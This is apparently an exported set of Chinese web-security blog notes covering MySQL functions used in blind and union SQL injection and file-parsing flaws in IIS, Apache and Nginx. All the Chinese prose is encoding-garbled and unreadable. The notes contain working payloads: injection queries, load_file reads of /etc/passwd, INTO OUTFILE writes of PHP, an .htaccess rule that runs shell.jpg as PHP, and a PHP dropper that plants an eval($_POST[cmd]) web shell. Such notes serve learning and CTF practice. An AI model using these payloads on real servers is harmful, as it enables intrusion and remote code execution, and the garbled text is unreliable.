<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">% : åŒ¹é…0ä¸ªæˆ–ä»»æ„å¤šä¸ªå­—ç¬¦</span><br><span class="line"></span><br><span class="line">_ : åŒ¹é…ä»»æ„ä¸€ä¸ªå­—ç¬¦</span><br><span class="line"></span><br><span class="line">escape ï¼š è½¬ä¹‰å­—ç¬¦ï¼Œå¯åŒ¹é…%å’Œ_</span><br></pre></td></tr></table></figure>
<h5 id="regexp-rlike">regexp/rlike</h5>
<p>å¸¸ç”¨é€šé…ç¬¦</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">. : åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦</span><br><span class="line"></span><br><span class="line">* ï¼š åŒ¹é…0ä¸ªæˆ–å¤šä¸ªå‰ä¸€ä¸ªå¾—åˆ°çš„å­—ç¬¦</span><br><span class="line"></span><br><span class="line">[] : åŒ¹é…ä»»æ„ä¸€ä¸ª[]å†…çš„å­—ç¬¦ï¼Œ[ab]*å¯åŒ¹é…ç©ºä¸²ã€aã€bã€æˆ–è€…ç”±ä»»æ„ä¸ªaå’Œbç»„æˆçš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line"></span><br><span class="line">^ : åŒ¹é…å¼€å¤´ï¼Œå¦‚^såŒ¹é…ä»¥sæˆ–è€…Så¼€å¤´çš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line"></span><br><span class="line">$ : åŒ¹é…ç»“å°¾ï¼Œå¦‚s$åŒ¹é…ä»¥sç»“å°¾çš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line"></span><br><span class="line">&#123;n&#125; : åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦åå¤næ¬¡ã€‚</span><br></pre></td></tr></table></figure>
<h5 id="å­—ç¬¦ä¸²åŒºåˆ†å¤§å°å†™æ¯”è¾ƒ">å­—ç¬¦ä¸²åŒºåˆ†å¤§å°å†™æ¯”è¾ƒ</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select &#39;A&#39; &#x3D; binary &#39;a&#39;;</span><br><span class="line">+------------------+</span><br><span class="line">| &#39;A&#39; &#x3D; binary &#39;a&#39; |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">+------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>
<h4 id="è‡ªå®šä¹‰æ’åº">è‡ªå®šä¹‰æ’åº</h4>
<h5 id="elt">elt</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">elt(N ,str1 ,str2 ,str3 ,â€¦)</span><br></pre></td></tr></table></figure>
<p>è‹¥ N = 1 ï¼Œåˆ™è¿”å›å€¼ä¸º str1 ï¼Œè‹¥ N = 2 ï¼Œåˆ™è¿”å›å€¼ä¸º str2 ï¼Œä»¥æ­¤ç±»æ¨ã€‚ è‹¥ N å°äº 1 æˆ–å¤§äºå‚æ•°çš„æ•°ç›®ï¼Œåˆ™è¿”å›å€¼ä¸º NULL ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT ELT(3,&#39;hello&#39;,&#39;halo&#39;,&#39;test&#39;,&#39;world&#39;);</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| ELT(3,&#39;hello&#39;,&#39;halo&#39;,&#39;test&#39;,&#39;world&#39;) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| test                                 |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>åœ¨ç›²æ³¨ä¸­çš„åº”ç”¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select elt(1,0);</span><br><span class="line">+----------+</span><br><span class="line">| elt(1,0) |</span><br><span class="line">+----------+</span><br><span class="line">| 0        |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select elt(1,1);</span><br><span class="line">+----------+</span><br><span class="line">| elt(1,1) |</span><br><span class="line">+----------+</span><br><span class="line">| 1        |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h5 id="field">field</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FIELD(str, str1, str2, str3, â€¦â€¦)</span><br></pre></td></tr></table></figure>
<p>å­—æ®µstræŒ‰ç…§å­—ç¬¦ä¸²str1ï¼Œstr2ï¼Œstr3ï¼Œstr4çš„é¡ºåºè¿”å›æŸ¥è¯¢åˆ°çš„ç»“æœé›†ã€‚å¦‚æœè¡¨ä¸­strå­—æ®µå€¼ä¸å­˜åœ¨äºstr1ï¼Œstr2ï¼Œstr3ï¼Œstr4ä¸­çš„è®°å½•ï¼Œæ”¾åœ¨ç»“æœé›†æœ€å‰é¢è¿”å›ã€‚</p>
<p>å½“ç„¶è¿™æ˜¯æ­£å¸¸çš„ç”¨æ³•ï¼Œè¿˜å¯ä»¥ç†è§£ä¸ºè¿™ä¸ªå‡½æ•°è¿”å›çš„æ˜¯str åœ¨åé¢è¿™äº›å­—ç¬¦ä¸²ä¸­çš„ç´¢å¼•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select field(&#39;halo&#39;,&#39;hello&#39;,&#39;test&#39;,&#39;world&#39;);</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| field(&#39;halo&#39;,&#39;hello&#39;,&#39;test&#39;,&#39;world&#39;) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">|                                    0 |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select field(&#39;halo&#39;,&#39;hello&#39;,&#39;test&#39;,&#39;halo&#39;,&#39;world&#39;);</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">| field(&#39;halo&#39;,&#39;hello&#39;,&#39;test&#39;,&#39;halo&#39;,&#39;world&#39;) |</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">|                                           3 |</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p><strong>åœ¨ç›²æ³¨ä¸­çš„åº”ç”¨</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select field(1,0);</span><br><span class="line">+------------+</span><br><span class="line">| field(1,0) |</span><br><span class="line">+------------+</span><br><span class="line">|          0 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select field(1,1);</span><br><span class="line">+------------+</span><br><span class="line">| field(1,1) |</span><br><span class="line">+------------+</span><br><span class="line">|          1 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„ç¬¬äºŒä¸ªå‚æ•°å†³å®šäº†è¿™æ¡è¯­å¥çš„æ‰§è¡Œç»“æœã€‚</p>
<h3 id="æ¡ä»¶è¡¨è¾¾å¼">æ¡ä»¶è¡¨è¾¾å¼</h3>
<h4 id="ifè¯­å¥">ifè¯­å¥</h4>
<p>if(condition,result1,result2)</p>
<p>å½“ condition ç»“æœä¸ºçœŸæ—¶è¿”å› result1 å¦åˆ™è¿”å› result2,è¿™å¸¸å¸¸ç”¨ä½œæˆ‘ä»¬ç›²æ³¨çš„å¼€å…³å‡½æ•°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select if(1,1,0);</span><br><span class="line">+-----------+</span><br><span class="line">| if(1,1,0) |</span><br><span class="line">+-----------+</span><br><span class="line">|         1 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select if(0,1,0);</span><br><span class="line">+-----------+</span><br><span class="line">| if(0,1,0) |</span><br><span class="line">+-----------+</span><br><span class="line">|         0 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h4 id="caseè¯­å¥">caseè¯­å¥</h4>
<p>åŸºæœ¬å½¢å¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">case(â€¦)whenâ€¦thenâ€¦elseâ€¦end</span><br></pre></td></tr></table></figure>
<p>ä¸¤ç§å˜ä½“ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">case expr when val1 then result1 when val2 then result2 else result3 end;</span><br></pre></td></tr></table></figure>
<p>å…ˆä¼šåˆ¤æ–­ expr çš„ç»“æœ ï¼Œå†æ ¹æ®è¯¥ç»“æœæ˜¯ val1 è¿˜æ˜¯ val2 æˆ–è€…å…¶ä»–ï¼Œæ¥æ‰§è¡Œä¸åŒçš„è¯­å¥ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">case when condition1 then result1 when condition2 result2 else result3 end;</span><br></pre></td></tr></table></figure>
<p>ç›´æ¥æ ¹æ®ä¸åŒæƒ…å†µè¿›è¡Œé€‰æ‹©ã€‚</p>
<p>æ¯”å¦‚å¯ä»¥æ„é€ è¿™æ ·ä¸€æ¡æ³¨å…¥è¯­å¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from test where id &#x3D;-1 union select 1,case when username like &#39;a%&#39; then 0 else 2222222222222222222 end,3,4 from tdb_admin</span><br></pre></td></tr></table></figure>
<h3 id="å­æŸ¥è¯¢">å­æŸ¥è¯¢</h3>
<blockquote>
<p>è¿™ä¸€å—æˆ‘è¿˜æ²¡å¤ªçœ‹æ˜ç™½ï¼Œå…ˆæŠŠæ¨¡æ¿è´´ä¸‹æ¥</p>
</blockquote>
<h4 id="æ¨¡æ¿ä¸€">æ¨¡æ¿ä¸€</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select ... from ... where col &#x3D; [any|all](select...);</span><br></pre></td></tr></table></figure>
<h4 id="æ¨¡æ¿äºŒ">æ¨¡æ¿äºŒ</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select ....from ... where col [not]in(select...);</span><br></pre></td></tr></table></figure>
<h4 id="æ¨¡æ¿ä¸‰">æ¨¡æ¿ä¸‰</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select row(value1,valu2...) &#x3D; [any&#x2F;some](select col1,col2...);</span><br></pre></td></tr></table></figure>
<h4 id="æ¨¡æ¿å››">æ¨¡æ¿å››</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select ... from ...where col [not]exists(select...);</span><br></pre></td></tr></table></figure>
<h4 id="æ¨¡æ¿äº”">æ¨¡æ¿äº”</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select ... from (select ...) as name where ...</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Webå®‰å…¨å­¦ä¹ </tag>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQLç›²æ³¨æ€»ç»“</title>
    <url>/Web_security/basic_learning/23.SQL%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E4%B9%8BMySQL%E7%9B%B2%E6%B3%A8%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="MySQLç›²æ³¨æ€»ç»“">MySQLç›²æ³¨æ€»ç»“</h1>
<p>æœ€è¿‘åœ¨åˆ·BUUCTFçš„æ—¶å€™ï¼Œç»å¸¸ç¢°åˆ°MySQLç›²æ³¨ï¼Œä½†æ˜¯æ¯æ¬¡ç¢°åˆ°éƒ½æœ‰ç‚¹ä¸çŸ¥é“æ€ä¹ˆä¸‹æ‰‹ï¼Œä¹Ÿçœ‹ä¸å‡ºæ¥æ˜¯å“ªç§ç±»å‹çš„æ³¨å…¥ï¼Œåœ¨æ­¤å°±æ€»ç»“ä¸€ä¸‹ã€‚ä¸»è¦æ˜¯ä¸¤ç§ç›²æ³¨æ–¹å¼ï¼š</p>
<ul>
<li>åŸºäºå¸ƒå°”çš„SQLç›²æ³¨</li>
<li>åŸºäºæ—¶é—´çš„SQLç›²æ³¨</li>
</ul>
<h2 id="0x01-å¸ƒå°”ç›²æ³¨">0x01 å¸ƒå°”ç›²æ³¨</h2>
<h3 id="ä½¿ç”¨æ¡ä»¶">ä½¿ç”¨æ¡ä»¶</h3>
]]></content>
  </entry>
  <entry>
    <title>æœåŠ¡å™¨æ–‡ä»¶è§£ææ¼æ´è®°å½•</title>
    <url>/Web_security/basic_learning/25.%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="æœåŠ¡å™¨æ–‡ä»¶è§£ææ¼æ´è®°å½•">æœåŠ¡å™¨æ–‡ä»¶è§£ææ¼æ´è®°å½•</h1>
<p>æ²¡æœ‰æ–°ä¸œè¥¿ï¼Œç®€å•è®°å½•ä¸€ä¸‹ã€‚</p>
<blockquote>
<p><a href="https://www.anquanke.com/post/id/166616">https://www.anquanke.com/post/id/166616</a></p>
</blockquote>
<h2 id="0x01-IISæ–‡ä»¶è§£ææ¼æ´">0x01 IISæ–‡ä»¶è§£ææ¼æ´</h2>
<p>ä½¿ç”¨iis5.x-6.xç‰ˆæœ¬çš„æœåŠ¡å™¨ï¼Œå¤§å¤šä¸ºwindows server 2003ï¼Œç½‘ç«™æ¯”è¾ƒå¤è€ï¼Œå¼€å‘è¯­å¥ä¸€èˆ¬ä¸ºaspï¼›è¯¥è§£ææ¼æ´ä¹Ÿåªèƒ½è§£æaspæ–‡ä»¶ï¼Œè€Œä¸èƒ½è§£æaspxæ–‡ä»¶ã€‚</p>
<h3 id="ç›®å½•è§£æ">ç›®å½•è§£æ</h3>
<p>å½¢å¼ï¼š<a href="http://www.xxx.com/xx.asp/xx.jpg">www.xxx.com/xx.asp/xx.jpg</a></p>
<p>åŸç†: æœåŠ¡å™¨é»˜è®¤ä¼šæŠŠ.aspï¼Œ.asaç›®å½•ä¸‹çš„æ–‡ä»¶éƒ½è§£ææˆaspæ–‡ä»¶ã€‚</p>
<h3 id="æ–‡ä»¶è§£æ">æ–‡ä»¶è§£æ</h3>
<p>å½¢å¼ï¼š<a href="http://www.xxx.com/xx.asp;.jpg">www.xxx.com/xx.asp;.jpg</a></p>
<p>åŸç†ï¼šæœåŠ¡å™¨é»˜è®¤ä¸è§£æ;å·åé¢çš„å†…å®¹ï¼Œå› æ­¤xx.asp;.jpgä¾¿è¢«è§£ææˆaspæ–‡ä»¶äº†ã€‚</p>
<h3 id="è¡¥å……">è¡¥å……</h3>
<p>IIS6.0çš„è§£ææ¼æ´åŒæ ·å­˜åœ¨äºIIS7.5ç‰ˆæœ¬ã€‚</p>
<h2 id="0x02-Apacheæ–‡ä»¶è§£ææ¼æ´">0x02 Apacheæ–‡ä»¶è§£ææ¼æ´</h2>
<h3 id="å¤šåç¼€">å¤šåç¼€</h3>
<p>Apache1.xå’Œ2.x è§£ææ–‡ä»¶çš„è§„åˆ™æ˜¯ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æ,å¦‚æœåç¼€åä¸ºä¸å¯è¯†åˆ«æ–‡ä»¶è§£æ,å°±å†å¾€å·¦åˆ¤æ–­ã€‚</p>
<h3 id="confé…ç½®">confé…ç½®</h3>
<p>1ã€å¦‚æœåœ¨ Apache çš„ conf é‡Œæœ‰è¿™æ ·ä¸€è¡Œé…ç½® <code>AddHandler php5-script .php</code> è¿™æ—¶åªè¦æ–‡ä»¶åé‡ŒåŒ…å« .php  å³ä½¿æ–‡ä»¶åæ˜¯ test2.php.jpg ä¹Ÿä¼šä»¥ php æ¥æ‰§è¡Œã€‚</p>
<p>2ã€å¦‚æœåœ¨ Apache çš„ conf é‡Œæœ‰è¿™æ ·ä¸€è¡Œé…ç½® <code>AddType application/x-httpd-php .jpg</code>å³ä½¿æ‰©å±•åæ˜¯ jpgï¼Œä¸€æ ·èƒ½ä»¥ php æ–¹å¼æ‰§è¡Œã€‚</p>
<h3 id="ç½•è§åç¼€">ç½•è§åç¼€</h3>
<p>Apache é…ç½®æ–‡ä»¶ä¸­ä¼šæœ‰<code>.+.ph(p[345]?|t|tml)</code>æ­¤ç±»çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œè¢«å½“ php ç¨‹åºæ‰§è¡Œçš„æ–‡ä»¶åè¦ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼ï¼Œå¦åˆ™å°±ç®— Apache æŠŠæŸæ–‡ä»¶å½“ php ç¨‹åºï¼Œphp è‡ªå·±ä¸è®¤å®ƒï¼Œä¹Ÿæ˜¯æ— ç”¨ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´<code>php3ï¼Œphp4ï¼Œphp5ï¼Œphtï¼Œphtml</code>ä¹Ÿæ˜¯å¯ä»¥è¢«è§£æçš„ã€‚</p>
<h3 id="htaccess">.htaccess</h3>
<p>è¦æƒ³ä½¿ <code>.htaccess</code> æ–‡ä»¶ç”Ÿæ•ˆï¼Œéœ€è¦ä¸¤ä¸ªæ¡ä»¶:</p>
<p><strong>ä¸€æ˜¯åœ¨ Apache çš„é…ç½®æ–‡ä»¶ä¸­å†™ä¸Šï¼š</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AllowOverrideAll</span><br></pre></td></tr></table></figure>
<p>è‹¥è¿™æ ·å†™åˆ™ <code>.htaccess</code> ä¸ä¼šç”Ÿæ•ˆï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AllowOverrideNone</span><br></pre></td></tr></table></figure>
<p><strong>äºŒæ˜¯ Apache è¦åŠ è½½ mod_Rewrite æ¨¡å—ã€‚åŠ è½½è¯¥æ¨¡å—ï¼Œéœ€è¦åœ¨ Apache çš„é…ç½®æ–‡ä»¶ä¸­å†™ä¸Šï¼š</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LoadModulerewrite_module&#x2F;usr&#x2F;lib&#x2F;apache2&#x2F;modules&#x2F;mod_rewrite.so</span><br></pre></td></tr></table></figure>
<p>è‹¥æ˜¯åœ¨ Ubuntu ä¸­ï¼Œå¯èƒ½è¿˜éœ€è¦æ‰§è¡Œå‘½ä»¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudoa2enmod rewrite</span><br></pre></td></tr></table></figure>
<p>é…ç½®å®Œåéœ€è¦é‡å¯ Apacheã€‚</p>
<p><strong>å¦‚åœ¨ <code>.htaccess</code> æ–‡ä»¶ä¸­å†™å…¥ï¼š</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddTypeapplication&#x2F;x-httpd-php xxx</span><br></pre></td></tr></table></figure>
<p>å°±æˆåŠŸåœ°ä½¿è¯¥ <code>.htaccess</code> æ–‡ä»¶æ‰€åœ¨ç›®å½•åŠå…¶å­ç›®å½•ä¸­çš„åç¼€ä¸º .xxx çš„æ–‡ä»¶è¢« Apache å½“åš php æ–‡ä»¶ã€‚</p>
<p>è¿˜æœ‰ä¸€ç§å†™æ³•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch&quot;shell.jpg&quot;&gt;</span><br><span class="line"> SetHandlerapplication&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
<h2 id="0x03-Nginxæ–‡ä»¶è§£ææ¼æ´">0x03 Nginxæ–‡ä»¶è§£ææ¼æ´</h2>
<h3 id="PHP-CGIè§£ææ¼æ´">PHP CGIè§£ææ¼æ´</h3>
<p>æ¼æ´åŸç†å‚è€ƒï¼š<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200819140421.png" alt=""></p>
<p>æ‰€ä»¥ä¸‹é¢ä¸¤ç§å†™æ³•éƒ½ä¼šå°†1.jpgå½“ä½œPHPæ¥è§£æ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg&#x2F;1.php  </span><br><span class="line"></span><br><span class="line">www.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg&#x2F;%20\0.php</span><br></pre></td></tr></table></figure>
<p>å¦å¤–ä¸€ç§æ‰‹æ³•ï¼šä¸Šä¼ ä¸€ä¸ªåå­—ä¸º test.jpgï¼Œä»¥ä¸‹å†…å®¹çš„æ–‡ä»¶:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç„¶åè®¿é—® <code>test.jpg/.php</code>, åœ¨è¿™ä¸ªç›®å½•ä¸‹å°±ä¼šç”Ÿæˆä¸€å¥è¯æœ¨é©¬ shell.phpã€‚</p>
<h3 id="ç©ºå­—èŠ‚ä»£ç æ‰§è¡Œæ¼æ´">ç©ºå­—èŠ‚ä»£ç æ‰§è¡Œæ¼æ´</h3>
<p>æ¶æ„ç”¨æˆ·å‘å‡ºè¯·æ±‚<code>http://example.com/file.extï¼…00.php</code>å°±ä¼šå°† <code>file.ext</code> ä½œä¸º PHP æ–‡ä»¶è§£æã€‚</p>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Webå®‰å…¨å­¦ä¹ </tag>
        <tag>æœåŠ¡å™¨è§£ææ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>Webå®‰å…¨å­¦ä¹ ä¹‹æ•°æ®åº“ç³»ç»ŸåŠŸèƒ½ç›¸å…³å­¦ä¹ </title>
    <url>/Web_security/basic_learning/4.%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="Webå®‰å…¨å­¦ä¹ ä¹‹æ•°æ®åº“ç³»ç»ŸåŠŸèƒ½ç›¸å…³å­¦ä¹ ">Webå®‰å…¨å­¦ä¹ ä¹‹æ•°æ®åº“ç³»ç»ŸåŠŸèƒ½ç›¸å…³å­¦ä¹ </h1>
<h2 id="ä»»åŠ¡ç›®æ ‡">ä»»åŠ¡ç›®æ ‡</h2>
<ol>
<li>å­¦ä¹ æ•°æ®åº“è‡ªå¸¦å‡½æ•°çš„åŠŸèƒ½å’Œç”¨æ³•ï¼ˆæ€è€ƒåœ¨ä»€ä¹ˆæƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨ï¼‰ï¼›</li>
<li>å°†æ‰€æœ‰æ¶‰åŠçš„å‡½æ•°è¿›è¡Œæµ‹è¯•å¹¶ä¸¾ä¾‹è¯´æ˜å…¶ç”¨æ³•ï¼›</li>
<li>æ‰©å±•å­¦ä¹ ï¼šé’ˆå¯¹ä¸åŒæ•°æ®åº“æ„é€ æ‰€éœ€ç¯å¢ƒï¼Œå°è¯•æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</li>
</ol>
<h2 id="0x01-MySQLå¸¸ç”¨å‡½æ•°">0x01 MySQLå¸¸ç”¨å‡½æ•°</h2>
<p>åœ¨è¿›è¡Œsqlæ³¨å…¥è¿‡ç¨‹ä¸­ï¼Œä¼šä½¿ç”¨åˆ°mysqlä¸­çš„å†…ç½®å‡½æ•°ã€‚åœ¨å†…ç½®å‡½æ•°ä¸­ï¼Œåˆåˆ†ä¸ºè·å–ä¿¡æ¯çš„å‡½æ•°å’ŒåŠŸèƒ½å‡½æ•°ã€‚<br>
ä¿¡æ¯å‡½æ•°æ˜¯ç”¨æ¥è·å–mysqlä¸­çš„æ•°æ®åº“çš„ä¿¡æ¯ï¼ŒåŠŸèƒ½å‡½æ•°å°±æ˜¯ä¼ ç»Ÿçš„å‡½æ•°ç”¨æ¥å®ŒæˆæŸé¡¹æ“ä½œã€‚</p>
<ol>
<li>
<p>å¸¸ç”¨çš„ä¿¡æ¯å‡½æ•°</p>
<ul>
<li>
<p><code>database()</code>ï¼šç”¨äºè·å–å½“å‰ä½¿ç”¨çš„æ•°æ®åº“ä¿¡æ¯</p>
<p><img src="https://i.loli.net/2019/09/01/kHTNF6UoWxnZBim.png" alt=""></p>
</li>
<li>
<p><code>version()</code>ï¼šè¿”å›æ•°æ®åº“çš„ç‰ˆæœ¬</p>
<p><img src="https://i.loli.net/2019/09/01/nuBY8U1WcEGFKDa.png" alt=""></p>
</li>
<li>
<p><code>user()</code>ï¼šè¿”å›å½“å‰çš„ç”¨æˆ·ï¼ˆç­‰ä»·äºcurrent_userå‚æ•°ï¼‰</p>
<p><img src="https://i.loli.net/2019/09/01/N3Y1HSFA4PjyXih.png" alt=""></p>
</li>
<li>
<p><code>@@datadir</code>ï¼šè·å–æ•°æ®åº“çš„å­˜å‚¨ä½ç½®</p>
<p><img src="https://i.loli.net/2019/09/01/nbvtak6T7yXpr5J.png" alt=""></p>
</li>
</ul>
</li>
<li>
<p>å¸¸è§çš„åŠŸèƒ½å‡½æ•°</p>
<ul>
<li>
<p><code>load_file()</code>ï¼šä»è®¡ç®—æœºä¸­è½½å…¥æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶ä¸­çš„æ•°æ®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from table union select 1, load_file(&#39;&#x2F;etc&#x2F;passwd&#39;), 3</span><br><span class="line">select * from table union select 1, load_file(0x2F6574632F706173737764), 3 #ä½¿ç”¨åå…­è¿›åˆ¶ç»•è¿‡å•å¼•å·é™åˆ¶</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>into_outfile()</code>ï¼šå†™å…¥æ–‡ä»¶ï¼Œå‰ææ˜¯å…·æœ‰å†™å…¥æ¡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &#39;&lt;?php phpinfo(); ?&gt;&#39; into outfile &#39;&#x2F;tmp&#x2F;xxx.php&#39;;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>concat()</code>ï¼šè¿”å›ä¸¤ä¸ªå‚æ•°ç›¸è¿æ¥äº§ç”Ÿçš„å­—ç¬¦ä¸²ã€‚å¦‚æœå…¶ä¸­ä¸€ä¸ªå‚æ•°ä¸ºNULLï¼Œåˆ™è¿”å›å€¼ä¸ºNULLã€‚</p>
<p><img src="https://i.loli.net/2019/09/02/rACWF9Ppve2ykfn.png" alt=""></p>
</li>
<li>
<p><code>group_concat()</code>ï¼šç”¨äºåˆå¹¶å¤šæ¡è®°å½•ä¸­çš„ç»“æœã€‚ç”¨æ³•å¦‚ä¸‹ï¼š</p>
<p><img src="https://i.loli.net/2019/09/02/OFPjlCwrDfgo2aE.png" alt=""></p>
<p>è¿”å›çš„å°±æ˜¯usersè¡¨ä¸­æ‰€æœ‰çš„ç”¨æˆ·åï¼Œå¹¶ä¸”æ˜¯ä½œä¸ºä¸€æ¡è®°å½•è¿”å›ã€‚</p>
</li>
<li>
<p><code>substr()</code>ï¼šç”¨äºæˆªæ–­å­—ç¬¦ä¸²ã€‚ç”¨æ³•ä¸ºï¼š<code>substr(str, pos, length)</code>ï¼Œæ³¨æ„<code>pos</code>æ˜¯ä»1å¼€å§‹çš„ã€‚</p>
<p><img src="https://i.loli.net/2019/09/02/PCRvu4mXKnriNTZ.png" alt=""></p>
</li>
<li>
<p><code>ascii()</code>ï¼šè¿”å›å­—ç¬¦æ‰€å¯¹åº”çš„asciiç ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select ascii(&#39;a&#39;);          #è¿”å›97</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>length()</code>ï¼šè¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select length(&#39;123456&#39;)     #è¿”å›6</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>if(exp1, exp2, exp3)</code>ï¼šå¦‚æœexp1æ˜¯Trueï¼Œåˆ™è¿”å›exp2ï¼›å¦åˆ™è¿”å›exp3ã€‚å¦‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1,2,if(1&#x3D;1,3,-1) #1,2,3</span><br><span class="line">select 1,2,if(1&#x3D;2,3,-1) #1,2,-1</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>ifnull(exp1, exp2)</code>ï¼šå¦‚æœexp1æ˜¯Trueï¼Œåˆ™è¿”å›exp1ï¼›å¦åˆ™è¿”å›exp2ã€‚å¦‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select ifnull(sleep(2), 2);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>nullif(exp1, exp2)</code>ï¼šå¦‚æœexp1==exp2ï¼Œåˆ™è¿”å›Nullï¼›å¦åˆ™è¿”å›exp2ã€‚</p>
</li>
</ul>
